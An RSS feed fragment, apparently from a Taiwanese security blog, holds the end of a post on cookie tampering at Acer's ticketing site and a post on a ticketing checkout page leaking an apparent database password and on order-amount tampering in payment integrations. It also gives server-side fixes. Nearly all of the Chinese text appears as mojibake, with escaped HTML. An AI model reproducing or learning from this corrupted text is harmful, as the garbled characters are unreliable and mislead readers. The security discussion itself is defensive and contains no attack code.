  &lt;li&gt;Ê©üÊïèË≥áÊñô‰∏çË¶ÅÂ≠ò&lt;/li&gt;
  &lt;li&gt;Âä†ÂØÜË≥áË®ä‰∏çÂèØÂ∞ë&lt;/li&gt;
  &lt;li&gt;Ë®≠ÂÆöÊ®ôÈ†≠‰∏çÊÄïÈß≠&lt;/li&gt;
  &lt;li&gt;‰∏ÄÊ¨°ÊêûÂÆöÊ≤íÁÖ©ÊÉ±&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê≤íÊÉ≥Âà∞‰ø°ÊâãÊãà‰æÜÂ∞±ÊòØ‰∏â‰∏ç‰∏ÄÊ≤íÊúâÔºåÂâçÈù¢ÂÜçÂä†ÂÄãÂãæÂãæÔºåÊÑüË¶∫Â•ΩÂÉèÂæàÂé≤ÂÆ≥Âë¢ÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;Áî±Êñº Cookie Â≠òÂú®ÁÄèË¶ΩÂô®Á´ØÔºåÊúâË¢´Á´ÑÊîπÁöÑÂèØËÉΩÔºåÊâÄ‰ª•Â¶ÇÊûúÁ∂≤Á´ô‰ΩøÁî® Cookie Ë™çË≠âÂ∞±ÊúÉÊúâ‰∏Ä‰∫õÂÆâÂÖ®‰∏äÁöÑÈ¢®Èö™„ÄÇÊú¨ÁØáÂ∞±‰ª•ÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®ÁÇ∫‰æãÔºåË™™ÊòéÈÄôÁ®ÆÂ∞èÁñèÂøΩÂèØËÉΩÊúÉÈÄ†ÊàêË¢´ÁõúÁî®Â∏≥ËôüÁöÑÈ¢®Èö™„ÄÇÈñãÁôºËÄÖÂú®Èù¢Â∞ç‰ΩøÁî®ËÄÖÂèØ‰ª•ÊîπËÆäÁöÑËÆäÊï∏‰∏ÄÂÆöË¶ÅÁâπÂà•Â∞èÂøÉËôïÁêÜÔºåÂÅöÂ•ΩË©≤ÊúâÁöÑÈò≤Ë≠∑ÔºåÈÇÑÊòØËÄÅË©±‰∏ÄÂè•Ôºö‰ΩøÁî®ËÄÖÂÇ≥‰æÜÁöÑË≥áÊñôÁöÜ‰∏çÂèØ‰ø°ÔºÅÂè™Ë¶ÅÊéåÊè°ÈÄôÂÄãÂéüÂâáÔºåÈñãÁôºÂá∫‰æÜÁöÑÁî¢ÂìÅÂ∞±ËÉΩÂ§†Â∞ëÂæàÂ§öÂæàÂ§öÈ¢®Èö™ÔºÅ&lt;/p&gt;

&lt;p&gt;Ë°åÊñáËá≥Ê≠§ÔºåÈ†êÊúü‰∏≠ÊòØË¶ÅÂÜçÊé®Âª£‰∏Ä‰∏ãÊºèÊ¥ûÂõûÂ†±Âπ≥Âè∞ÔºåÈ†Ü‰æøÁ®±ËÆöÂÆèÁ¢ÅÈùûÂ∏∏ÈáçË¶ñË≥áÂÆâÔºå‰øÆÂæ©Âø´ÈÄüÔºåÊòØËâØÂ•ΩÁöÑÊ≠£Âæ™Áí∞„ÄÇ‰∏çÈÅéÂâçÂÖ©Â§©ÁúãÂà∞‰∏Ä‰∫õÈóúÊñºÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®ÁöÑÊñ∞ËÅûÊôÇÔºå‰∏äÁ∑öÁôºÁèæÊ≠§Âº±Èªû‰ªçÊú™‰øÆÂæ©ÔºåÈÄôÂ•ΩÂÉèÁúüÁöÑÊúâÈªû‰∏çÊáâË©≤ÔºåÁï¢Á´üÂÆòÊñπ‰∏äÈÄ±Â∑≤Á∂ìÊé•Êî∂Âà∞ÈÄöÂ†±ÔºåË¶Å‰øÆÂæ©ÈÄôÂÄãÂº±Èªû‰πüÂè™ÈúÄ‰∏ÄË°åÂà§Êñ∑Âºè‚Ä¶„ÄÇËÉΩÁêÜËß£ÈÄôÊ¨°ÁöÑÂº±ÈªûÂú®Áü≠ÊôÇÈñìÈñãÁôºÈÅéÁ®ã‰∏≠ÂæàÈõ£Ë¢´Ê≥®ÊÑèÂà∞ÔºåÂ∞çÊñºÈÄôÊ®£‰∏ÄÂÄã‰∏ÄÈÄ±‰∏çÁú†‰∏ç‰ºëÂÆåÊàêÁöÑÂîÆÁ•®Á∂≤Á´ôÔºåÊàëÂÖ∂ÂØ¶‰πüÊòØÁµ¶‰∫àÊªøÈ´òÁöÑË©ïÂÉπÔºå‰ΩÜÂ¶ÇÊûúÂÆòÊñπËÉΩÂÜçÂ¢ûÂÖ©ÂàÜÂ∞çË≥áÂÆâ‰∫ã‰ª∂ÁöÑÈáçË¶ñÔºåÁõ∏‰ø°‰∏ãÊ¨°ÂÆöËÉΩ‰ª•ÊªøÂàÜ‰πãÂßøÂëàÁèæÂú®‰ΩøÁî®ËÄÖÈù¢ÂâçÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/30/cookie-security-insight-acer/</link>
                <guid>https://devco.re/blog/2015/01/30/cookie-security-insight-acer</guid>
                <pubDate>Fri, 30 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ÂæûÂØ¨ÂÆèÂîÆÁ•®Ë´áË≥áÂÆâ</title>
                <description>&lt;p&gt;Êà¥Â§´ÂØáÁàæÈÉ®ËêΩÊ†ºÂÅúËºâ‰∫ÜÂø´ÂÖ©ÂÄãÊúàÔºåÈùûÂ∏∏Êä±Ê≠âÔºåËÆìÂêÑ‰ΩçÂ∏∏Â∏∏ÂÇ¨Á®øÁöÑÊúãÂèãÂÄë‰πÖÁ≠â‰∫Ü &amp;lt;(_ _)&amp;gt;&lt;br /&gt;
‰ªäÂ§©Â∞±‰πòËëóÂÖ®Ëá∫ÁòãË≤∑Á•®ÁöÑÊµ™È†≠Ôºå‰æÜË´áË´á‰∏Ä‰∫õÂ∏∏Ë¢´ÂøΩÁï•ÁöÑË≥áË®äÂÆâÂÖ®Â∞èÊ¶ÇÂøµÂêßÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Ê±üËïôÂºïÈÄÄÊºîÂî±ÊúÉ‰∏ÄÁ•®Èõ£Ê±ÇÔºåÈöîÂ≤∏ËßÄ‰∫ÜÂÖ©Â§©ÁÅ´Ôºå ‰πüÂøç‰∏ç‰ΩèÊÉ≥Ë¶ÅÁï∂ÂÄãÈçµÁõ§Â≠ùÂ≠ê„ÄÇÁÑ°Â•àÈÅãÊ∞£‰∏çÂ•Ω‰∏ÄÁõ¥ÈÄ£‰∏ç‰∏ä‰∏ªÊ©üÔºå„ÄéService Unavailable„ÄèÁï´Èù¢ÁúãËÜ©‰∫ÜÔºåÂè™Â•ΩÁúãÁúãÊö´Â≠òÈ†ÅÈù¢ÁöÑÁ∂≤È†ÅÂéüÂßãÁ¢ºÔºå‰∏çÁúãÈÇÑÂ•ΩÔºå‰∏ÄÁúãÊàëÈ©öÂëÜ‰∫ÜÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot; alt=&quot;ÂØ¨ÂÆèÂîÆÁ•®Ë≥áË®äÊ¥©Êºè&quot; title=&quot;ÂØ¨ÂÆèÂîÆÁ•®Ë≥áË®äÊ¥©Êºè&quot; /&gt;&lt;/a&gt;
ÔºàÁâπÂà•ËÅ≤ÊòéÔºöÊ≠§ÊµÅÁ®ã‰∏≠‰∏¶ÁÑ°‰ªª‰ΩïÊîªÊìäË°åÁÇ∫ÔºåË©≤È†ÅÈù¢ÊòØÊ≠£Â∏∏Ë≥ºÁ•®ÊµÅÁ®ã‰∏≠Âá∫ÁèæÁöÑÁ∂≤È†ÅÔºâ&lt;/p&gt;

&lt;p&gt;Âú®ÁµêÂ∏≥Á∂≤È†ÅÂéüÂßãÁ¢ºÁï∂‰∏≠Á´üÁÑ∂ÁúãÂà∞‰∫ÜÁñë‰ººË≥áÊñôÂ∫´ÂØÜÁ¢º SqlPassWord Âú®Ë°®ÂñÆË£°Èù¢ÔºÅÈÄô‰ª∂‰∫ãÂæûË≥áÂÆâÁöÑËßíÂ∫¶‰æÜÁúãÔºåÈô§‰∫ÜË°®Èù¢‰∏äÊ¥©Êºè‰∫ÜË≥áÊñôÂ∫´ÂØÜÁ¢º‰πãÂ§ñÔºåÈÇÑÊúâÂÖ©ÂÄãÊàëÊÉ≥Ë¨õÂæà‰πÖ‰ΩÜËã¶ÁÑ°Ê©üÊúÉË´áÁöÑË≥áÂÆâË≠∞È°åÔºåÂàÜÂà•ÊòØÈáëÊµÅ‰∏≤Êé•Â∏∏Ë¶ãÁöÑÂº±Èªû‰ª•ÂèäÈß≠ÂÆ¢ÁöÑÂøÉÁêÜ„ÄÇËóâËëóÂØ¨ÂÆèÂîÆÁ•®Á∂≤È†ÅÊ¥©ÊºèÂØÜÁ¢ºÈÄô‰ª∂‰∫ãÊÉÖÔºåÈ†ÜÈÅìËàáÂ§ßÂÆ∂ÂàÜ‰∫´ÂàÜ‰∫´ÂêßÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;Ë´áÂè∞ÁÅ£Á∂≤Á´ôÁöÑÈáëÊµÅ‰∏≤Êé•&quot;&gt;Ë´áÂè∞ÁÅ£Á∂≤Á´ôÁöÑÈáëÊµÅ‰∏≤Êé•&lt;/h3&gt;

&lt;p&gt;Âú®Êú¨ÁØáÁöÑ‰æãÂ≠ê‰∏≠ÔºåÂØ¨ÂÆèÂîÆÁ•®Á∂≤È†ÅË°®ÂñÆÂá∫Áèæ‰∫ÜÁñë‰ººË≥áÊñôÂ∫´ÂØÜÁ¢ºÔºåÈÄôÁãÄÊ≥ÅÂ∞±Â•ΩÂÉèÂéªÈäÄË°åÁπ≥Ê¨æÔºåÊ´ÉÊ™ØÁµ¶‰Ω†‰∏ÄÊääÈë∞ÂåôË∑ü‰Ω†Ë™™Ôºö„ÄéÈÄôÊòØÈáëÂ∫´ÁöÑÈë∞ÂåôÔºåÈ∫ªÁÖ©‰Ω†Âà∞Â∞çÈù¢ÈÇ£ÂÄãÊ´ÉÊ™ØÊääÈë∞ÂåôÁµ¶ÊúçÂãôÂì°ÔºåË´ã‰ªñÂπ´‰Ω†ÊääÈå¢ÊîæÈÄ≤ÈáëÂ∫´Ë£°Èù¢„Äè„ÄÇ&lt;br /&gt;
ÊòØ‰∏çÊòØÊúâÈªûÂ§öÊ≠§‰∏ÄËàâÔºåÈäÄË°åÊú¨‰æÜÂ∞±ÊúÉÊúâ‰∏Ä‰ªΩÈë∞ÂåôÔºåÂππÂòõË¶ÅË´ã‰Ω†ÔºàÁÄèË¶ΩÂô®ÔºâÂπ´ÂøôËΩâ‰∫§Ôºü&lt;br /&gt;
Â¶ÇÊûú‰ªäÂ§©Â£û‰∫∫ÊãøÂà∞‰∫ÜÈÄôÊääÈë∞ÂåôÔºåÊòØ‰∏çÊòØÂè™Ë¶ÅÁπûÈÅé‰øùÂÖ®ÁöÑË¶ñÁ∑öÔºåÂ∞±ÂèØ‰ª•ÊâìÈñãÈáëÂ∫´ÁÇ∫ÊâÄÊ¨≤ÁÇ∫Ôºü&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;
&lt;br /&gt;ÔºàPhoto by StockMonkeys.comÔºâ&lt;/p&gt;

&lt;p&gt;È°û‰ººÁöÑÁãÄÊ≥Å‰πüÊªøÂ∏∏ÁôºÁîüÂú®ÈõªÂ≠êÂïÜÂãôËàáÁ¨¨‰∏âÊñπÈáëÊµÅÊúçÂãôÁöÑ‰∏≤Êé•‰∏ä„ÄÇ&lt;br /&gt;
Ë®±Â§öÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÂ∞àÊ≥®ÊñºÂïÜÂãôÔºåÈÅ∏ÊìáÂ∞á‰ªòÊ¨æÊ≠•È©üÂßîË®óÁ¨¨‰∏âÊñπÈáëÊµÅÊúçÂãôËôïÁêÜÔºå‰∏ÄËà¨Â∏∏Ë¶ãÁöÑÊµÅÁ®ãÊòØÈÄôÊ®£ÁöÑÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÈõªÂ≠êÂïÜÂãôË®ÇÂñÆÊàêÁ´ãÔºåÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÁµ¶‰Ω†‰∏ÄÂºµÂñÆÂ≠êÔºå‰∏äÈù¢ÂØ´ËëóÔºö„ÄéË®ÇÂñÆ 123 ËôüÔºå ÈáëÈ°ç 456 ÂÖÉ„ÄèÔºåË´ã‰Ω†Â∞áÂñÆÂ≠êËΩâ‰∫§Áµ¶Á¨¨‰∏âÊñπÈáëÊµÅÊúçÂãôÁ∂≤Á´ô‰∏¶Áπ≥Ê¨æ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÈáëÊµÅÊúçÂãôÁ∂≤Á´ô‰æùÊìö‰Ω†Áµ¶ÂÆÉÁöÑÂñÆÊìöÊî∂Âèñ 456 ÂÖÉÔºå‰∏¶‰∏îË∑üÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôË™™Ôºö„ÄéË®ÇÂñÆ 123 Â∑≤ÊàêÂäüÁπ≥Ê¨æÔºåÊ¨æÈ†Ö 456 ÂÖÉ„Äè„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊúÄÂæåÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÂëäË®¥‰Ω†Ë®ÇÂñÆ 123 ËôüË≥ºË≤∑ÊàêÂäü„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Â¶ÇÊûúÁèæÂú®Êúâ‰∏ÄÂÄãÊÉ°ÊÑè‰ΩøÁî®ËÄÖÔºå‰ªñÂÅö‰∫Ü‰ª•‰∏ãÊÉ°ÊêûÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Âú®Ê≠•È©ü‰∏ÄÊääÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÁµ¶ÁöÑÂñÆÂ≠ê‰øÆÊîπÊàêÔºö„ÄéË®ÇÂñÆ 123 ËôüÔºåÈáëÈ°ç 20 ÂÖÉ„ÄèÔºàÂéüÂÉπÊòØ 456 ÂÖÉÔºâ&lt;/li&gt;
  &lt;li&gt;ÈáëÊµÅÊúçÂãôÂïÜ‰æùÊìöÂñÆÊìöË∑üÊÉ°ÊÑè‰ΩøÁî®ËÄÖÊî∂Âèñ 20 ÂÖÉË≤ªÁî®Ôºå‰∏¶‰∏îÂëäË®¥ÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÔºö„ÄéË®ÇÂñÆ 123 Â∑≤ÊàêÂäüÁπ≥Ê¨æÔºåÊ¨æÈ†Ö 20 ÂÖÉ„Äè&lt;/li&gt;
  &lt;li&gt;ÊúÄÂæåÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÁúãÂà∞„ÄéË®ÇÂñÆ 123 Â∑≤ÊàêÂäüÁπ≥Ê¨æ„ÄèÁöÑË®äÊÅØÔºåÂ∞±ÂëäË®¥‰ΩøÁî®ËÄÖË™™Ë®ÇÂñÆ 123 Ë≥ºË≤∑ÊàêÂäü„ÄÇ‰πüÂ∞±ÊòØÊÉ°ÊÑè‰ΩøÁî®ËÄÖÂè™Ëä±Âèñ 20 ÂÖÉÂ∞±Ë≥ºË≤∑Âà∞ÂéüÂÉπ 456 ÂÖÉÁöÑÁî¢ÂìÅ„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(ËÅ≤ÊòéÔºöÁÇ∫Ê±ÇÁ≤æÁ∞°ÔºåÈõªÂ≠êÂïÜÂãôËàáÈáëÊµÅÊúçÂãô‰∏≤Êé•ÊµÅÁ®ãÊúâÁ∂ìÈÅéÁ∞°ÂåñÔºåÊúâÊäìÂà∞Á≤æÈ´ìÂ∞±Â•ΩXD)&lt;/p&gt;

&lt;p&gt;‰∏çÁÆ°ÊòØÂØ¨ÂÆèÂîÆÁ•®Âá∫ÁèæÂØÜÁ¢ºÊ¨Ñ‰ΩçÈÇÑÊòØ‰∏ä‰æãÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÁöÑÈáëÊµÅ‰∏≤Êé•ÔºåÊúÄÂ§ßÁöÑÂïèÈ°åÂú®Êñº‰ªñÂÄëÈÉΩÁõ∏‰ø°‰ΩøÁî®ËÄÖÊúÉÊ≠£Â∏∏Âπ´ÂøôËΩâ‰∫§ÔºåÂç≥Èù†ÂÆ¢Êà∂Á´ØÁöÑÁÄèË¶ΩÂô®‰æÜËΩâÂùÄÂÇ≥ÂÄº„ÄÇË¶ÅÁü•ÈÅìÔºåÂà©Áî®ÁÄèË¶ΩÂô®ËΩâÂùÄÂÇ≥ÂÄºÊòØ‰∏çÂèØÈù†ÁöÑÔºå‰∏Ä‰æÜÔºåÈáçË¶ÅÁöÑË≥áË®äÂ∞±ÊúÉË¢´ÂÆ¢Êà∂Áü•ÈÅìÔºå‰æãÂ¶ÇÂØ¨ÂÆèÂîÆÁ•®Áñë‰ººÊ¥©ÊºèË≥áÊñôÂ∫´ÂØÜÁ¢ºÔºõ‰∫å‰æÜ‰∏≠ÈñìÁöÑÂÖßÂÆπÂèØ‰ª•‰øÆÊîπÔºå‰æãÂ¶Ç‰øÆÊîπË®ÇÂñÆÈáëÈ°ç„ÄÇÂè¶Â§ñÔºåÂèØËÉΩÊúâ‰∫∫ÊúÉÁôºÁèæÂà∞ÔºåÂú®ÊÉ°ÊÑè‰ΩøÁî®ËÄÖÁöÑÊ≠•È©ü‰∏âË£°Èù¢ÔºåÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÁ´üÁÑ∂Ê≤íÊúâÁ¢∫Ë™ç‰ªòÊ¨æÈáëÈ°çÊòØÂê¶Ê≠£Á¢∫ÔºåÊ≤íÈåØÔºåÈÄôÊòØÊúÉÁôºÁîüÁöÑ‰∫ãÊÉÖÔºåÂú®ÈÅéÂéªÁ∂ìÈ©ó‰∏≠ÔºåÂÉèÈÄôÊ®£Ê≤íÊúâÊØîÂ∞ç‰ªòÊ¨æÈáëÈ°çÁöÑÂè∞ÁÅ£Á≥ªÁµ±ÊØî‰æãÈÇÑ‰∏çÂ∞ëÔºåÈÄô‰∫õÁñèÂøΩÈÉΩÊúÉÈÄ†Êàê‰ºÅÊ•≠ÂæàÂ§öÊàêÊú¨ÊêçÂ§±Ôºå‰∏çÂèØ‰∏çÊ≥®ÊÑè„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè∞ÁÅ£ÁõÆÂâçÈÇÑÊªøÂ∏∏Ë¶ãÂà∞ÈÄôÁ®ÆÊ†πÊìö‰ΩøÁî®ËÄÖÂÇ≥‰æÜÂñÆÊìö‰æÜÊî∂Ë≤ªÁöÑÁãÄÊ≥ÅÔºåÂ∞éËá¥ÂñÆÊìöÂèØÁ´ÑÊîπÈÄ†Êàê‰ºÅÊ•≠ÊêçÂ§±ÔºåÊüêÈÉ®ÂàÜÂéüÂõ†ÂèØ‰ª•Ê≠∏ÂíéÂà∞Êó©ÊúüÁ¨¨‰∏âÊñπÈáëÊµÅÁöÑÁØÑ‰æãÈÉΩÊòØÈÄôÊ®£ÂØ´ÁöÑÔºåÂ∑•Á®ãÂ∏´‰πüÂ∞±Áõ¥Êé•Âª∂Á∫åÈÄôÊ®£ÁöÑÂØ´Ê≥ïÁõ¥Âà∞ÁèæÂú®„ÄÇ‰ª•ÈáëÊµÅ‰∏≤Êé•ÁÇ∫‰æãÔºåÊØîËºÉÂ•ΩÁöÑËôïÁêÜÊñπÂºèÊúâ‰∏ãÈù¢ÂÖ©Á®ÆÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Âú®ÂñÆÊìö‰∏äÂä†ÂÖ•Èò≤ÂÅΩÊ®ôË®òÔºåËÆìÊÉ°ÊÑè‰ΩøÁî®ËÄÖÁÑ°Ê≥ïËºïÊòìÁ´ÑÊîπÂñÆÊìö„ÄÇÂú®ÊäÄË°ì‰∏ä‰ΩúÊ≥ïÊúâÈªûÈ°û‰ºº OAuth Âú® Signing Request ÊôÇÁöÑ‰ΩúÊ≥ïÔºåÂú®Ë´ãÊ±Ç‰∏≠Â§öÈÄÅ‰∏ÄÁµÑÊ™¢Êü•Á¢ºÔºåÈÄèÈÅé one-way hash ÁöÑÊñπÂºèÊ™¢Êü•Á∂≤ÂùÄÊòØÂê¶ÊúâË¢´‰øÆÊîπÔºåÁõÆÂâçÂ§ßÈÉ®ÂàÜÈáëÊµÅÂïÜÈÉΩÊúâÊèê‰æõÁõ∏‰ººËß£Ê≥ï„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂñÆÊìö‰∏çÂÜçÁµ¶‰ΩøÁî®ËÄÖËΩâ‰∫§ÔºåÈõªÂ≠êÂïÜÂãôÁõ¥Êé•ÂÇ≥ÂñÆÂ≠ê„ÄéË®ÇÂñÆ 123 ËôüÔºåÈáëÈ°ç 20 ÂÖÉ„ÄèÁµ¶ÈáëÊµÅÊúçÂãôÁ∂≤Á´ôÔºå‰∏¶Ë´ã‰ΩøÁî®ËÄÖÁõ¥Êé•ÂéªÂ∞àÂ±¨ÁöÑÈáëÊµÅÂïÜÁ™óÂè£Áπ≥Ë≤ªÂç≥ÂèØ„ÄÇÂú®ÊäÄË°ì‰∏äÂ∞±ÊòØÂ∞áÁÄèË¶ΩÂô®ËΩâÂùÄÂÇ≥ÂÄºÁöÑÂãï‰ΩúÂÖ®ÈÉ®ËÆäÊàê‰º∫ÊúçÂô®Â∞ç‰º∫ÊúçÂô®Ê∫ùÈÄöËôïÁêÜÊéâ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ª•‰∏äÂÖ©Á®Æ‰ΩúÊ≥ïÔºåÂ∞áÂèØ‰ª•ÊúâÊïàÈò≤Ê≠¢ÊÉ°ÊÑè‰ΩøÁî®ËÄÖ‰øÆÊîπË®ÇÂñÆÈáëÈ°ç„ÄÇÊ≠§Â§ñÔºåÂª∫Ë≠∞ÈõªÂ≠êÂïÜÂãôÁ∂≤Á´ôÂú®Êî∂Âà∞ÈáëÊµÅÂõûÂÇ≥ÁöÑ‰ªòÊ¨æË≥áË®äÂæåÔºåËÉΩÂ§†ÊØîÂ∞çÊî∂ÂèñÊ¨æÈ†ÖËàáË®ÇÂñÆÊ¨æÈ†ÖÊòØÂê¶Áõ∏Á¨¶ÔºåÂ¶ÇÊ≠§ÈõôÈáçÊ™¢Êü•ÔºåËÉΩÂ§ßÂ§ßÈÅøÂÖçÊÉ°ÊÑèË°åÁÇ∫ÔºåÊ∏õÂ∞ë‰ºÅÊ•≠ËôïÁêÜÊÉ°ÊÑèÈáëÊµÅÂïèÈ°åÁöÑÊàêÊú¨„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ë´áÈß≠ÂÆ¢ÂøÉÁêÜ&quot;&gt;Ë´áÈß≠ÂÆ¢ÂøÉÁêÜ&lt;/h3&gt;

&lt;p&gt;ÂæàÊòéÈ°ØÁöÑÔºåÂØ¨ÂÆèÂîÆÁ•®Ê¥©ÊºèÂØÜÁ¢ºÁöÑÁãÄÊ≥ÅÊòØÂ∑•Á®ãÂ∏´ÁöÑÂ∞èÁñèÊºè„ÄÇÂú®‰∏çÁü•ÈÅìË≥áÊñôÂ∫´Á¢∫Âàá‰ΩçÁΩÆÁöÑÂâçÊèê‰∏ãÔºåÁü•ÈÅìÁñë‰ººË≥áÊñôÂ∫´ÂØÜÁ¢ºÁöÑÊù±Ë•øÁ¢∫ÂØ¶‰πüÁÑ°Ê≥ïÂÅö‰ªÄÈ∫ºÔºåÈ†ÇÂ§öÂ∞±ÊòØ‰∫ÜËß£‰∫Ü‰∏ÄÂÆ∂ÂÖ¨Âè∏Âà∂ÂÆöÂØÜÁ¢ºÁöÑÁ≠ñÁï•„ÄÇÁÑ∂ËÄåÔºåÁúãÂú®Èß≠ÂÆ¢ÁúºË£°ÔºåÈÄôÈªûÁñèÂ§±ÊúÉ‰ª£Ë°®Ëëó‰∏ÄÂÄãÁ∂≤Á´ôÈù¢Â∞çË≥áÂÆâÁöÑÊÖãÂ∫¶„ÄÇÈÄ£È°ØËÄåÊòìË¶ãÁöÑÂïèÈ°åÈÉΩÊ≤íÊúâÊ≥®ÊÑèÔºåÈÇ£ÂæåÁ´ØÁ®ãÂºèÊáâË©≤‰πüÊúâÂèØËÉΩÂá∫ÁèæÊºèÊ¥û„ÄÇ‰∏ÄÊó¶Èß≠ÂÆ¢Ê±∫ÂÆöË¶ÅÊîªÊìäÈÄôÂÄãÁ∂≤Á´ôÔºåÂã¢ÂøÖÊúÉÊê¨Âá∫ÊØîÂπ≥Â∏∏ÈÇÑË¶ÅÂ§öÁöÑË≥áÊ∫êÂéªÂòóË©¶ÔºåÂõ†ÁÇ∫‰ªñÂÄëË™çÁÇ∫ÈÄôÂÄãÊäïË≥áÂ†±ÈÖ¨ÁéáÂæàÈ´ò„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ÄËà¨Èß≠ÂÆ¢Âü∫Êú¨‰∏äÊúÉ‰∏çÊñ∑ÁöÑÂæûÊâÄÁúãÂà∞ÁöÑÁ∂≤È†ÅË≥áË®ä‰æÜË™øÊï¥Ëá™Â∑±ÊîªÊìäÁöÑÂº∑Â∫¶ÔºåÂ¶ÇÊûú‰ªñÂÄë‰∏çÊñ∑ÁúãÂà∞‰∫ÜÂ•áÊÄ™ÁöÑÁôªÂÖ•Áï´Èù¢Ôºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_1.png&quot; alt=&quot;ÂØ¨ÂÆèÂîÆÁ•®ÁôªÂÖ•È†ÅÈù¢1&quot; title=&quot;ÂØ¨ÂÆèÂîÆÁ•®ÁôªÂÖ•È†ÅÈù¢1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊàñÊòØÈò≤ÁÅ´ÁâÜÁöÑÁôªÂÖ•Áï´Èù¢&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_2.png&quot; alt=&quot;ÂØ¨ÂÆèÂîÆÁ•®ÁôªÂÖ•È†ÅÈù¢2&quot; title=&quot;ÂØ¨ÂÆèÂîÆÁ•®ÁôªÂÖ•È†ÅÈù¢2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Â∞±ÂæàÊúâÂèØËÉΩÊúÉÂ¢ûÂä†ÊîªÊìäÁöÑÂäõÈÅì„ÄÇ‰∏äÈù¢ÈÄôÁ®ÆÁôªÂÖ•È†ÅÈù¢Â∞±ÊòØÂ∞±ÊòØ‰∏ÄÁ®ÆÂ∏∏Ë¶ãÁöÑË≥áË®äÊ¥©ÊºèÔºåÂú®‰ªäÂπ¥Âè∞ÁÅ£Èß≠ÂÆ¢Âπ¥ÊúÉÁöÑË≠∞Á®ãÔºç„Äå&lt;a href=&quot;https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;Ë¢´ÈÅ∫ÂøòÁöÑË≥áË®äÊ¥©Êºè&lt;/a&gt;„ÄçÂ∞±ÊèêÂèä‰∫ÜÈÄôÈ°ûË≥áË®äÊ¥©ÊºèÂú®Âè∞ÁÅ£ÊòØÂæàÊôÆÂèäÁöÑ„ÄÇÊ≥®ÊÑèÔºåÂá∫ÁèæÈÄôÊ®£ÁöÑÈ†ÅÈù¢‰∏¶‰∏çÊÑèÂë≥ËëóÁ∂≤Á´ôÊúÉÊúâÊºèÊ¥ûÔºåÂè™ÊòØÁ∂≤Á´ôÂÆπÊòìÂõ†Ê≠§Â§öÂèóÂà∞‰∏Ä‰∫õÊîªÊìä„ÄÇÂèç‰πãÔºåÂ¶ÇÊûú‰∏ÄÂÄãÁ∂≤Á´ôÂâçÁ´ØÈ†ÅÈù¢ÂØ´ÁöÑ‰πæÊ∑®ÊºÇ‰∫ÆÔºåÁîöËá≥ÈÄ£ &lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP ÂÆâÂÖ® header&lt;/a&gt; ÈÄôÁ®ÆÂ∞èÁ¥∞ÁØÄÈÉΩÊúÉÊ≥®ÊÑèÂà∞ÔºåÈß≠ÂÆ¢ÂèØËÉΩÂ∞±ÊúÉË™çÁÇ∫ÈÄôÂÄãÁ∂≤Á´ôÂØ´ÁöÑÂæàÂö¥Ë¨πÔºåÁîöËá≥ÈÄ£ÂòóË©¶ÁöÑÊÖæÊúõÈÉΩÊ≤íÊúâ‰∫Ü„ÄÇ&lt;/p&gt;

